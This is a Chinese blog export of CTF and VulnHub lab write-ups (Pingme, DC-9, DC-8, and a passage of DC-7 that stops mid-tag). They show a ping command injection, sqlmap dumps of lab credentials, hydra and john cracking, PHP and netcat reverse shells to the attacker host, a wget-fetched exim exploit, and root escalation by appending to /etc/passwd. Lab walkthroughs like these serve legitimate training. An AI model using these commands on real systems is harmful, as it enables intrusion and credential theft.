<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>青少年CTF刷题</title>
      <link href="/posts/50792/"/>
      <url>/posts/50792/</url>
      
        <content type="html"><![CDATA[<h1>web</h1><h2 id="Pingme">Pingme</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221103172948691.png" alt="题目"></p><p>典型的ping命令执行，执行127.0.0.1||ls看一下是否能用||这个通配符</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221103173145847.png" alt="ls"></p><p>发现能用且列出了当前目录下的文件，那就直接cat flag.php</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221103173322136.png" alt="cat flag.php"></p><p>发现并没有显示，做的时候懵了一下，然后试着F12然后看看是不是漏了什么信息，然后就看到了flag</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221103174636433.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 青少年CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-9复现</title>
      <link href="/posts/5012/"/>
      <url>/posts/5012/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-9复现">DC-9复现</h2><h2 id="描述">描述</h2><blockquote><p>DC-9是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>这个挑战的最终目标是获得根并阅读唯一的标志。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p></blockquote><h2 id="信息收集">信息收集</h2><p>确定目标的ip以及开启的端口</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201165354852.png" alt="image-20221201165354852"></p><p>发现有一个完整的表单，那就直接sqlmap爆破数据库</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201165637107.png" alt="image-20221201165637107"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.71.131/results.php&quot;</span>  --data <span class="string">&quot;search=1&quot;</span> --dbs</span><br></pre></td></tr></table></figure><p>爆出三个库</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201165842274.png" alt="image-20221201165842274"></p><p>爆破表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.71.131/results.php&quot;</span>  --data <span class="string">&quot;search=1&quot;</span> -D <span class="built_in">users</span> --tables</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201170044666.png" alt="image-20221201170044666"></p><p>爆破列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.71.131/results.php&quot;</span>  --data <span class="string">&quot;search=1&quot;</span> -D <span class="built_in">users</span> -T UserDetails --dump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Database: users</span><br><span class="line">Table: UserDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| id | lastname   | password      | reg_date            | username  | firstname |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |</span><br><span class="line">| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |</span><br><span class="line">| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |</span><br><span class="line">| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |</span><br><span class="line">| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |</span><br><span class="line">| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span><br><span class="line">| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |</span><br><span class="line">| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |</span><br><span class="line">| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |</span><br><span class="line">| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |</span><br><span class="line">| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span><br><span class="line">| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |</span><br><span class="line">| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |</span><br><span class="line">| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |</span><br><span class="line">| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |</span><br><span class="line">| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |</span><br><span class="line">| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br></pre></td></tr></table></figure><p>同理爆破另一个库，其中的一个库的<strong>Users</strong>表爆出了admin的密码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201170903369.png" alt="image-20221201170903369"></p><p><strong>StaffDetails</strong>表的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Database: Staff</span><br><span class="line">Table: StaffDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+</span><br><span class="line">| id | email                 | phone          | lastname   | reg_date            | firstname | position                      |</span><br><span class="line">+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+</span><br><span class="line">| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |</span><br><span class="line">| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |</span><br><span class="line">| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |</span><br><span class="line">| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |</span><br><span class="line">| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |</span><br><span class="line">| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |</span><br><span class="line">| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |</span><br><span class="line">| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |</span><br><span class="line">| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |</span><br><span class="line">| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |</span><br><span class="line">| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |</span><br><span class="line">| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |</span><br><span class="line">| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |</span><br><span class="line">| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |</span><br><span class="line">| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |</span><br><span class="line">| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |</span><br><span class="line">| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |</span><br><span class="line">+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+</span><br></pre></td></tr></table></figure><h2 id="登录后台">登录后台</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201170938946.png" alt="image-20221201170938946"></p><p>脚标处有一句<code>File does not exist </code>，判断是不是存在本地文件包含漏洞</p><p>验证存在</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201171921652.png" alt="image-20221201171921652"></p><p>然后要利用到端口敲门：</p><p>原理简单分析：<br>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。<br>　　<br>简单来说就是：知道它的自定义端口后，依次对其进行敲门，然后就可以开启ssh服务从而进行连接了。它的默认配置文件为：/etc/knockd.conf</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201172310863.png" alt="image-20221201172310863"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 7469 192.168.71.131</span><br><span class="line">nmap -p 8475 192.168.71.131</span><br><span class="line">nmap -p 9842 192.168.71.131</span><br></pre></td></tr></table></figure><p>执行完以上命令后再查看22端口的ssh服务，就看到是已经打开了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22 192.168.71.131</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201172545368.png" alt="image-20221201172545368"></p><p>利用前面信息收集到的员工账号密码做一个字典，然后进行爆破</p><h2 id="ssh登录">ssh登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dc9_users.txt -P dc9_pass.txt 192.168.71.131 ssh</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201173634705.png" alt="image-20221201173634705"></p><p>爆破出三个账号密码，随便一个账号登录上去，发现我们现在只是爆破出了部分账户而已</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201174103178.png" alt="image-20221201174103178"></p><p>利用su命令切换我们爆破出的用户，发现在janitor的目录下有一个文件夹里记录了其他用户的密码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201174344319.png" alt="image-20221201174344319"></p><p>那我们直接加到我们的密码本里，再爆破一次，果然爆出了一个新的</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201174707763.png" alt="image-20221201174707763"></p><p>登录到fredf，发现可以执行<code>sudo -l</code>可以看到该账号可以运行root权限的test文件，而且不需要密码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201174840644.png" alt="image-20221201174840644"></p><p>然后找到了这个文件的源码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201175410975.png" alt="image-20221201175410975"></p><p>经过查看发现这个py文件的大致内容就是将参数1的内容写入参数2中，接下来尝试进行提权</p><h2 id="提权">提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt admin 111111</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;admin:$1$admin$2WRLhTGcIMgZ7OhwCpREK1:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/aaa</span><br><span class="line">sudo /opt/devstuff/dist/test/test /tmp/aaa /etc/passwd</span><br><span class="line">su admin</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> theflag.txt </span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201180059726.png" alt="image-20221201180059726"></p><ul><li>[参考博客](<a href="https://blog.csdn.net/Long_gone/article/details/104049869?ops_request_misc=%7B%22request%5Fid%22%3A%22166988492316782412557232%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=166988492316782412557232&amp;biz_id=0&amp;spm=1018.2226.3001.4187">(19条消息) vulnhub靶机DC-9渗透测试_Long_gone的博客-CSDN博客</a>)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-8复现</title>
      <link href="/posts/54148/"/>
      <url>/posts/54148/</url>
      
        <content type="html"><![CDATA[<h1>DC-8复现</h1><h2 id="描述">描述</h2><blockquote><p>DC-8是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>这个挑战有点混合，既是实际挑战，又是关于在Linux上安装和配置的双因素身份验证是否可以防止Linux服务器被利用的“概念证明”。</p><p>这个挑战的“概念验证”部分是由于Twitter上被问到一个关于双因素身份验证和Linux的问题，也是由于@theart42的建议。</p><p>此挑战的最终目标是绕过双因素身份验证，获取root并读取唯一的标志。</p><p>除非您尝试通过SSH登录，否则您甚至可能不知道安装和配置了双因素身份验证，但它肯定在那里并且正在做它的工作。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p></blockquote><h2 id="信息收集">信息收集</h2><p>确认目标机器的IP以及开启的端口</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201150628772.png" alt="image-20221201150628772"></p><p>访问80端口，点击welcome to DC-8发现这个url有点问题，猜想有sql注入</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201151645623.png" alt="image-20221201151645623"></p><p>扫描目录看看有没有登录口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.71.130 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201160557499.png" alt="image-20221201160557499"></p><h2 id="SQl注入">SQl注入</h2><p>在nid参数后面加入一个<code>'</code>后出现了sql报错直接<strong>sqlmap</strong>跑一下</p><h3 id="爆破数据库">爆破数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.71.130/?nid=1&quot;</span> --dbs</span><br></pre></td></tr></table></figure><p>得到两个库，其中<code>information_schema</code>是为了提供了访问数据库元数据的方式，所以可以暂时忽略</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201152316983.png" alt="image-20221201152316983"></p><h3 id="爆破表">爆破表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.71.130/?nid=1&quot;</span> -D d7db --tables</span><br></pre></td></tr></table></figure><p>一共88个表，包含有<strong>users</strong>表，</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201153542043.png" alt="image-20221201153542043"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201153559541.png" alt="image-20221201153559541"></p><h3 id="爆破列">爆破列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.71.130/?nid=1&quot;</span> -D d7db -T <span class="built_in">users</span> --columns</span><br></pre></td></tr></table></figure><p>得到16列</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201153635852.png" alt="image-20221201153635852"></p><h3 id="爆破字段名">爆破字段名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.71.130/?nid=1&quot;</span> -D d7db -T <span class="built_in">users</span> -C name,pass,uid --dump</span><br></pre></td></tr></table></figure><p>得到两个用户名和经过加密的密码，将密码保存好，利用<strong>john</strong>进行爆破</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201154123064.png" alt="image-20221201154123064"></p><h2 id="爆破密码">爆破密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john dc8_pass.txt</span><br></pre></td></tr></table></figure><p>爆出一个：turtle</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201154620496.png" alt="image-20221201154620496"></p><h2 id="登录后台">登录后台</h2><p>爆出密码后尝试利用登录，前面信息收集的时候就有发现其登录入口，经过测试，发现爆破出来的是john的密码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201160940053.png" alt="image-20221201160940053"></p><p>在<code>Content-&gt;Contact Us-&gt;Webform-&gt;Form settings</code>里发现有可利用点，可以写入php代码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201161518710.png" alt="image-20221201161518710"></p><h2 id="反弹shell">反弹shell</h2><p>编写php文件直接执行命令反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc -e /bin/bash 192.168.71.128 6666&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201162252984.png" alt="image-20221201162252984"></p><p>切换交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="提权">提权</h2><p>find查找suid权限的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201162431555.png" alt="image-20221201162431555"></p><p>其中的exim4是可利用进行提权的</p><p>首先查看exim4的版本</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201162654433.png" alt="image-20221201162654433"></p><p>搜索exim 4.89的漏洞</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201162930425.png" alt="image-20221201162930425"></p><p>复制文件到当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/46996.sh hack.sh  </span><br></pre></td></tr></table></figure><p>利用python起http服务进行传输</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 6666</span><br></pre></td></tr></table></figure><p>进入tmp文件夹下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp//tmp文件夹</span><br><span class="line">wget 192.168.71.128:6666/hack.sh//下载目标文件</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201163259748.png" alt="image-20221201163259748"></p><p>但是这个文件是不可执行的，所以要对其赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l//查看当前目录下的所有文件权限</span><br><span class="line">chmod 777 hack.sh//赋予文件可读、可写和可执行权限</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201163421012.png" alt="image-20221201163421012"></p><p>脚本有两种方式，使用第二种利用<strong>netcat</strong>再次进行反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./hack.sh -m netcat//执行脚本</span><br><span class="line">nc -e /bin/bash 192.168.71.128 31337//反弹shell</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201164356827.png" alt="image-20221201164356827"></p><h2 id="flag">flag</h2><p>进到根目录下找到flag</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201164614977.png" alt="image-20221201164614977"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-7复现</title>
      <link href="/posts/54139/"/>
      <url>/posts/54139/</url>
      
        <content type="html"><![CDATA[<h1>DC-7复现</h1><h2 id="描述">描述</h2><blockquote><p>DC-7是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>虽然这不是一个过于技术性的挑战，但它并不容易。</p><p>虽然这是早期DC版本的逻辑进展（我不会告诉你是哪一个），但涉及一些新概念，但你需要自己弄清楚这些概念。:-)如果您需要诉诸暴力破解或字典攻击，您可能不会成功。</p><p>你需要做的，是“跳出框框”思考。</p><p>哇 盒子的“外面”。:-)</p><p>这个挑战的最终目标是获得根并阅读唯一的标志。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p></blockquote><h2 id="信息收集">信息收集</h2><p>确定目标的<strong>IP</strong>，以及开放的端口</p><p><code>nmap 192.168.71.0/24</code></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201092525322.png" alt="image-20221201092525322"></p><p>访问80端口上的服务</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201093011739.png" alt="image-20221201093011739"></p><p>机翻</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201093141461.png" alt="image-20221201093141461"></p><p>根据这个提示，说不是技术性的问题，那就有可能是找线索，然后可以发现在脚标处有一个@DC7USER，用谷歌搜索进到了他的GitHub主页，在他的staffdb仓库中的config.php里发现了一个账号和密码，还有数据库的名字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201093608772.png" alt="image-20221201093608772"></p><h2 id="漏洞利用">漏洞利用</h2><h3 id="账号密码泄露利用">账号密码泄露利用</h3><p>直接在网页登录，是失败的</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201093747135.png" alt="image-20221201093747135"></p><p>那就换一个思路，我们最开始扫描机器的时候，发现其开启了22端口，那就尝试ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh dc7user@192.168.71.129</span><br></pre></td></tr></table></figure><p>登录成功</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201094354750.png" alt="image-20221201094354750"></p><p>在当前目录下，发现了两个文件夹<strong>backups</strong>和<strong>mbox</strong>，其中backups是有两个gpg结尾的文件，经过查阅得知这是一种加密文件的后缀；在mbox里记录着root的定时任务，其项目位于<code>/opt/scripts/backups.sh</code></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201095704000.png" alt="image-20221201095704000"></p><p>查看<strong><a href="http://backups.sh">backups.sh</a></strong>里的内容</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201095822202.png" alt="image-20221201095822202"></p><p>因为是一个shell脚本，那就看是否够权限写入，并执行进行反弹shell</p><p><code>ls -l</code></p><p>发现并没有权限</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201100418322.png" alt="image-20221201100418322"></p><h3 id="drush修改密码">drush修改密码</h3><p>在<strong><a href="http://backups.sh">backups.sh</a></strong>里，我们看到了<strong>drush</strong>命令，进行简单的了解后发现可以利用</p><p>drush部分命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看用户信息</span><br><span class="line">drush user-information admin//查询是否存在admin</span><br><span class="line">修改密码</span><br><span class="line">drush upwd admin --password=&quot;1234&quot;//修改admin密码为1234</span><br></pre></td></tr></table></figure><p>存在admin用户</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201101409140.png" alt="image-20221201101409140"></p><p>admin密码修改成功</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201101440524.png" alt="image-20221201101440524"></p><p>成功登录</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201101512704.png" alt="image-20221201101512704"></p><h3 id="反弹shell">反弹shell</h3><p>这个站的cms是Drupal8，它是不支持php代码的，需要添加模块</p><p><img src="C:%5CUsers%5Calpha%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221201101820426.png" alt="image-20221201101820426"></p><p>位置：<strong>manage</strong>-&gt;<strong>extend</strong>-&gt;<strong>install new module</strong></p><p>可以选者在<strong>intsall from a url</strong>里面填入下载地址进行安装，也可以下载之后选择<strong>Upload a module or theme archive to install</strong>导入安装，我因为url导入不成功，就用上传的方式</p><p>下载地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221201102310752.png" alt="image-20221201102310752"></p><p>回退到Extend界面进行安装</p><p><img 